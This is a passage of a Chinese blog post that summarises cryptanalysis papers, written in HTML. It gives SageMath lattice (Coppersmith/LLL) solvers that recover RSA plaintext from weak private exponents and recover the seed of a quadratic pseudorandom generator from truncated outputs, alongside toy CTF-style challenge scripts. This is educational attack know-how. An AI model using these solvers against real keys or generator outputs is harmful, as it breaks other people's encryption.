class="built_in">pow</span>(n, <span class="number">0.292</span>)).bit_length())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;k:&quot;</span>, <span class="built_in">int</span>((e*l+<span class="number">1</span>)//phi).bit_length()) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;s:&quot;</span>, <span class="built_in">int</span>(-(- p*q-p*r-q*r+p+q+r-<span class="number">1</span>)).bit_length(), (e*l+<span class="number">1</span>)%phi)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">3704855880199540844684471393029778120200002813949971360136836003907617079514427255259825490435790649664138871845360184183073872646513192202430710533078190575826155713068744709583570510772621029194153863144755360680033314134935729641409858927102852838393218895739195668535274536709281331345175528259157861065616063566929061511075538144994303970324882263003736862014947891493045792994888813518254951107205150366762567709160899275278290082623427916958936685063542070448203429654262629010495931973366595478108454303001166436472657033875639872107526273894029423116895670271482208759223339472443202529003559834010956579057550304035996781556930209533455218170729774110756890067380613398785135178534351816918723620913751308520437964511223695725422274481239326850229034260356127594295167293900845312931038087669377326174835490892683438456026242621938736672798206106255717837124241306665260390927662990617721108445864168564068679774771</span></span><br><span class="line">e = <span class="number">2579271279819129677259661444954914000666072869502638373178980948909533424491832236497960827501329860971550060261378562191167092003892029187217381648251227209888222865583154715494119051077991070639878344492936557614415646110493087019450502958684873800502915439789785744551138568723038978413155958712745053980751008235098250055536659575134228336501115649317438024973918535888256664343043528978069590120756670547012670694337838043731922729678149498449241644086246379410101777117264609059232085810975637823706717665777393995734136770737808127271624662132723654664822386827312049691647353315441193716937609509086747665203779389877231389093990180442621437624902437317786590413644715855729798317961116164135452594427839159636091052187175465636699712792431603669274508449578839043435909733404572369414375558622851009282814010908190673544245027388000734293296785729220989948292158236508597861682409318312771683238002694678886507726643</span></span><br><span class="line">c = <span class="number">3321686527839713784281865320915365186718914426372568147226900747934424971609058886767014657335201345693492402124153235870441581968989563743036987489869498147727995690110276112315627325751032107869571604209331406287257146070688086796985083077377983705501489461748053735715624625817539346814955089793502069052665237244440977377005202916595947645638697290341675939891343898336630496335003367142808068651997452238677604659776704436577439714366690375503750042702564409830282153015593741953197055210539798623447872923368458885335754145632598677560334295170950292271778808409691306757984287954611672331937918629091327502408673578690882770895863804939832868557899024008087584937528465704630770511022284926855620785655746708574591891203804095283687857736371538546085029132573864729037118939569119738784797269530709999308262444690199676954172291287762192926122627438851327047378271070528913534458191137543045842937033303998948036956961</span></span><br><span class="line"></span><br><span class="line">P = Zmod(ZZ(e))[<span class="string">&quot;k,s&quot;</span>]</span><br><span class="line">k, s = P.gens()</span><br><span class="line">f = <span class="number">1</span> + k * (n - s)</span><br><span class="line">rs = small_roots(f, (<span class="number">2</span>**<span class="number">490</span>, <span class="number">2</span>**<span class="number">2050</span>), m=<span class="number">4</span>, d=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(rs)</span><br><span class="line">k, s = <span class="built_in">map</span>(<span class="built_in">int</span>, rs[<span class="number">0</span>])</span><br><span class="line">phi = n - s</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-5-总结"><a href="#1-5-总结" class="headerlink" title="1.5 总结"></a>1.5 总结</h2><p>RSA私钥指数过大会导致与私钥指数过小一样不安全。特别的，对于RSA，私钥指数 $|d|&lt;N^{1&#x2F;4}\sqrt 6$ 与 $|d|&lt; N^{0.292}$ 都会带来不安全性。</p><h1 id="0x02-二次生成器的密码分析"><a href="#0x02-二次生成器的密码分析" class="headerlink" title="0x02 二次生成器的密码分析"></a>0x02 二次生成器的密码分析</h1><p><a href="https://github.com/AL3XEI709/papers/blob/main/Cryptanalysis_of_the_Quadratic_Generator.pdf">Link</a></p><blockquote><p>令 $p$ 为素数，$a,c$ 为模 $p$ 有限域内的整数。<strong>二次生成器</strong> (QCG) 是一个由等式关系 $v_{n+1}&#x3D;av_n^2+c\mod p$ 构成的伪随机数序列 $(v_n)$ 。这篇论文展示了如果任意多个连续的 $v_n$ 的<strong>高位已知</strong>，就可以在多项式时间内<strong>还原初始变量</strong> $v_0$ (即使在参数 $c$ 未知的情况下)，前提是初始变量 $v_0$ 不在某些特殊值的小的子集里。</p></blockquote><h2 id="2-1-二次生成器"><a href="#2-1-二次生成器" class="headerlink" title="2.1 二次生成器"></a>2.1 二次生成器</h2><p>令 $p$ 为素数，$a,c$ 为模 $p$ 有限域内的整数。<strong>二次生成器</strong> (QCG) 是一个由等式关系 $v_{n+1}&#x3D;av_n^2+c\mod p$ 构成的伪随机数序列 $(v_n)$ 。等式中的 $a, c$​ 分别被称为乘子和偏移量。</p><p>在密码设置中，初始量 $v_0$ 以及常量 $a, c$ 应该被设为私钥，利用生成器生成流密码。显然，如果多个连续的 $v_n$ 已知，求得 $v_0,a,c$ 是很容易的。所以在这个设置中，我们只输出 $v_n$ 的最高有效位 (msb) ，希望能让输出的序列更难预测。本篇论文讨论的就是在这种情况下如何预测 $v_{n+j}$ 。</p><p>假设序列 $(v_n)$ 未知，但对于给定的 $n$ ，一些近似值 $w_j$ 已知。以下分别讨论 $a,c$ 公开和 $a$ 公开，$c$ 不公开的两种情况下，如果 $w_j$ 条件足够好，$v_{n+j}$ 和 $a$ 就能在多项式内还原。</p><p>在开始前，还要定义一个参数 $\Delta$ ，用来衡量 $w_j$ 近似 $v_{n+j}$ 的程度。这个参数通常假设为 $\Delta &lt; p$ 。更确切地，$w$ 是 $u$ 的 $\Delta$ - 近似，等价于 $|w-u|&lt;\Delta$ 。</p><h2 id="2-2-乘子与偏移量已知，预测二次生成器"><a href="#2-2-乘子与偏移量已知，预测二次生成器" class="headerlink" title="2.2 乘子与偏移量已知，预测二次生成器"></a>2.2 乘子与偏移量已知，预测二次生成器</h2><p><strong>定理1.</strong> 令 $p$ 为素数，$\Delta$ 为 整数且 $p&gt;\Delta&gt;1$ 。对任意 $a, c\in F_p $ ，存在一个算法，当 $a,c$ 与二次生成器产生的两个连续的值 $v_0,v_1$  $\Delta$-近似的 $w_0,w_1$ 已知时，在多项式时间内返回 $v_0$ 的值。</p><p>令 $\varepsilon_j&#x3D;v_j-w_j,j&#x3D;0,1$ 。由 $v_1\equiv av_0^2+c\mod p$ ，可得<br>$$<br>w_1+\varepsilon_1-a(w_0+\varepsilon_0)^2-c\equiv0\mod p<br>$$<br>令<br>$$<br>A\equiv(w_1-aw_0^2-c)\mod p, \qquad B_1\equiv-2aw_0\Delta\mod p,\<br>B_2\equiv\Delta\mod p,\qquad C\equiv-a\Delta^2\mod p<br>$$<br>可得<br>$$<br>A\Delta^2+B_1\Delta\varepsilon_0+B_2\Delta\varepsilon_1+C\varepsilon_0^2\equiv0\mod p<br>$$<br>因此由同余式<br>$$<br>Ax_0+B_1x_1+B_2x_2+Cx_3\equiv0\mod p,\<br>x_0\equiv0\mod \Delta^2,\<br>x_1\equiv x_2\equiv0\mod \Delta<br>$$<br>构成的格 $L$ 含有解  $x&#x3D;(x_0,x_1,x_2,x_3)\in ZZ^4$ 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">Bits = <span class="number">512</span></span><br><span class="line">UnKnownBits = <span class="number">146</span> </span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;AL3XEI_FAKE_FLAG&#125;&#x27;</span> </span><br><span class="line"></span><br><span class="line">p = getPrime(Bits) </span><br><span class="line">a, c = [randint(<span class="number">0</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;ac&quot;</span>] </span><br><span class="line"></span><br><span class="line">v_0 = bytes_to_long(flag) </span><br><span class="line">v_1 = (a*v_0**<span class="number">2</span>+c)%p </span><br><span class="line">v_2 = (a*v_1**<span class="number">2</span>+c)%p  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;high_v1 = <span class="subst">&#123;v_1&gt;&gt;UnKnownBits&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;high_v2 = <span class="subst">&#123;v_2&gt;&gt;UnKnownBits&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line">a = </span><br><span class="line">c = </span><br><span class="line">p = </span><br><span class="line">high_v1 = </span><br><span class="line">high_v2 = </span><br><span class="line">PR = Zmod(ZZ(p))[<span class="string">&quot;l1, l2&quot;</span>] </span><br><span class="line">l1, l2 = PR.gens() </span><br><span class="line">f = a*(high_v1*(<span class="number">2</span>^<span class="number">146</span>)+l1)^<span class="number">2</span>+c-(high_v2*(<span class="number">2</span>^<span class="number">146</span>)+l2)</span><br><span class="line">low_v1 = ZZ(small_roots(f, (<span class="number">2</span>^<span class="number">146</span>, <span class="number">2</span>^<span class="number">146</span>), m=<span class="number">3</span>, d=<span class="number">4</span>)[<span class="number">0</span>][<span class="number">0</span>]) </span><br><span class="line"></span><br><span class="line">v_0 = mod(((high_v1*(<span class="number">2</span>^<span class="number">146</span>)+low_v1)-c)*inverse_mod(a, p)%p, p).sqrt() </span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(ZZ(v_0)))</span><br></pre></td></tr></table></figure><h2 id="2-3-乘子已知，偏移量未知，预测二次生成器"><a href="#2-3-乘子已知，偏移量未知，预测二次生成器" class="headerlink" title="2.3 乘子已知，偏移量未知，预测二次生成器"></a>2.3 乘子已知，偏移量未知，预测二次生成器</h2><p><strong>定理2.</strong> 令 $p$ 为素数，$\Delta$ 为 整数且 $p&gt;\Delta&gt;1$ 。对任意 $a, c\in F_p $ ，存在一个算法，当 $a$ 与二次生成器产生的三个连续的值 $v_0,v_1,v_2$  $\Delta$-近似的 $w_0,w_1,w_2$ 已知时，在多项式时间内返回 $v_0$​ 的值。</p><p>令 $v_i&#x3D;w_i+\varepsilon_i,|\varepsilon_i|&lt;\Delta,i&#x3D;0,1,2$ ，且 $av_i^2+c&#x3D;v_{i+1}\mod p,i&#x3D;0,1$ ，可得含已知量 $a,w_i$ 和未知量 $\varepsilon_i$ 的方程：<br>$$<br>(aw_0^2-w_1-aw_1^2+w_2)+2aw_0\varepsilon_0-\<br>(1+2aw_1)\varepsilon_1+\varepsilon_2+a(\varepsilon_0^2-\varepsilon_1^2)\equiv 0\mod p<br>$$<br>向量 $(1,\varepsilon_0,\varepsilon_1,\varepsilon_2,\varepsilon_0^2-\varepsilon1^2 )$ 满足已知的一致性系数。为了使量标更平衡，将上式写作：<br>$$<br>(aw_0^2-w_1-aw_1^2+w_2)\Delta^2+2aw_0\Delta\Delta\varepsilon_0-(1+2aw_1)\Delta\Delta\varepsilon_1+\<br>+\Delta\Delta\varepsilon_2+a\Delta^2(\varepsilon_0^2-\varepsilon_1^2)\equiv0\mod p<br>$$<br>因此由同余式<br>$$<br>(aw_0^2-w_1-aw_1^2+w_2)x_0+2aw_0\Delta x_1-(1+2aw_1)\Delta x_2+\<br>+\Delta x_3+a\Delta^2 x_4\equiv0\mod p,\<br>x_0\equiv0\pmod \Delta^2,\<br>x_1,x_2,x_3\equiv0\mod \Delta<br>$$<br>构成的格 $L$ 含有解 $e&#x3D;(\Delta^2,\Delta\varepsilon_0,\Delta\varepsilon_1,\Delta\varepsilon_2,\varepsilon_0^2-\varepsilon_1^2)\in ZZ^5$ 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">Bits = <span class="number">256</span></span><br><span class="line">UnKnownBits = <span class="number">48</span></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;AL3XEI_FAKE_FLAG&#125;&#x27;</span> </span><br><span class="line"></span><br><span class="line">p = getPrime(Bits) </span><br><span class="line">a, c = [randint(<span class="number">0</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;ac&quot;</span>] </span><br><span class="line">v_0 = bytes_to_long(flag) </span><br><span class="line"><span class="keyword">assert</span> v_0&lt;p</span><br><span class="line">v_1 = (a*v_0**<span class="number">2</span>+c)%p </span><br><span class="line">v_2 = (a*v_1**<span class="number">2</span>+c)%p  </span><br><span class="line">v_3 = (a*v_2**<span class="number">2</span>+c)%p  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;high_v0 = <span class="subst">&#123;v_1&gt;&gt;UnKnownBits&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;high_v1 = <span class="subst">&#123;v_2&gt;&gt;UnKnownBits&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;high_v2 = <span class="subst">&#123;v_3&gt;&gt;UnKnownBits&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">UnKnownBits = <span class="number">48</span></span><br><span class="line">a = </span><br><span class="line">p = </span><br><span class="line">high_v0 = </span><br><span class="line">high_v1 = </span><br><span class="line">high_v2 = </span><br><span class="line"></span><br><span class="line">high_v0 = high_v0&lt;&lt;UnKnownBits</span><br><span class="line">high_v1 = high_v1&lt;&lt;UnKnownBits</span><br><span class="line">high_v2 = high_v2&lt;&lt;UnKnownBits</span><br><span class="line"></span><br><span class="line">PR = Zmod(ZZ(p))[<span class="string">&quot;l0, l1, l2&quot;</span>] </span><br><span class="line">l0, l1, l2 = PR.gens() </span><br><span class="line">f =( a*high_v0^<span class="number">2</span>-high_v1-a*high_v1^<span class="number">2</span>+high_v2 ) + <span class="number">2</span>*a*high_v0*l0 - (<span class="number">1</span>+<span class="number">2</span>*a*high_v1)*l1 + l2 + a*(l0^<span class="number">2</span>-l1^<span class="number">2</span>) </span><br><span class="line"></span><br><span class="line">ls = small_roots(f, (<span class="number">2</span>^UnKnownBits, <span class="number">2</span>^UnKnownBits, <span class="number">2</span>^UnKnownBits), m=<span class="number">3</span>, d=<span class="number">4</span>)</span><br><span class="line">v_0, v_1, v_2 = high_v0+ZZ(ls[<span class="number">0</span>][<span class="number">0</span>]), high_v1+ZZ(ls[<span class="number">0</span>][<span class="number">1</span>]), high_v2+ZZ(ls[<span class="number">0</span>][<span class="number">2</span>]) </span><br><span class="line">c = (v_1 - a*v_0^<span class="number">2</span>) </span><br><span class="line"></span><br><span class="line">sd = mod((v_0-c)*inverse_mod(a, p)%p, p).sqrt() </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(ZZ(sd)))</span><br></pre></td></tr></table></figure><h2 id="2-4-总结-尚未解决的问题"><a href="#2-4-总结-尚未解决的问题" class="headerlink" title="2.4 总结 &amp; 尚未解决的问题"></a>2.4 总结 &amp; 